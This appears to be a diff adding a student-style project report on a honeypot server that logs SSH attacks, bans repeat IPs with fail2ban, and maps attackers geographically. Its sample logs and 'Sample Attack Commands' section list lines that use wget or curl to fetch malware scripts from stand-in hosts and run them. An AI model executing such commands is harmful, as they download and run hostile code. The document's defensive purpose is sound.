@@ -1,0 +1,68 @@
+
+Honeypot Server to Detect Attack Patterns - Project Report
+
+Project Title:
+Honeypot Server to Detect Attack Patterns
+
+Objective:
+Deploy a honeypot server to simulate vulnerable services (SSH/FTP), attract real-world attackers, log their activity, identify attack patterns, block malicious actors, and visualize global attacker behavior.
+
+Tools & Technologies:
+Tool           | Purpose
+-------------- | ------------------------------------------
+Cowrie         | SSH/Telnet honeypot to emulate shell
+Python         | Custom honeypot + log parsing & analysis
+fail2ban       | Automatic IP banning for repeated attacks
+GeoIP API      | IP geolocation
+Matplotlib/Folium | Visualization
+
+Architecture Overview:
+Attacker <--> Honeypot VM <--> Logging System --> Log Analyzer --> GeoIP + Visualization
+
+Setup Guide
+1. Install Dependencies: bash setup.sh
+2. Run Honeypot: python3 honeypot/custom_honeypot.py
+3. Logs stored in logs/cowrie.log
+
+Sample Logs:
+[2025-06-10 10:44:12] IP: 45.67.89.101 CMD: SSH-2.0-OpenSSH_8.0
+[2025-06-10 10:44:13] IP: 45.67.89.101 CMD: wget http://malicious.com/virus.sh
+
+Sample Attack Commands:
+wget http://malicious.com/script.sh
+curl http://badhost.ru/backdoor.sh
+/bin/sh install.sh
+
+Log Analysis:
+- 87 unique IPs detected in 3 days.
+- 3 IPs responsible for ~65% of attempts.
+- Most common method: wget or curl to fetch malware.
+
+Top IPs:
+192.168.1.23    - 23 attempts
+154.34.12.9     - 18 attempts
+200.45.67.1     - 12 attempts
+
+Fail2Ban Integration:
+Blocks repeated attackers after 3 failed attempts.
+- Jail: honeypot, Port: 2222, Max Retry: 3, Ban Time: 3600s
+- Regex: \[.*\] IP: <HOST> CMD:.*
+
+IP Geolocation & Visualization:
+- geoip_lookup.py used to map IPs
+- world_map.html: Interactive map
+- ip_heatmap.png: Heatmap
+- top_attackers_bar_chart.png: Bar chart
+
+Security Outcomes:
+Metric                 | Value
+---------------------- | ------
+Unique IPs logged      | 87
+Attacks blocked        | 15 (via fail2ban)
+Avg. attempts/IP       | 6.2
+Attack commands logged | 241
+
+Conclusion:
+Successfully simulated and detected attacker behaviors.
+Visualized geographic patterns.
+Integrated fail2ban to auto-block threats.
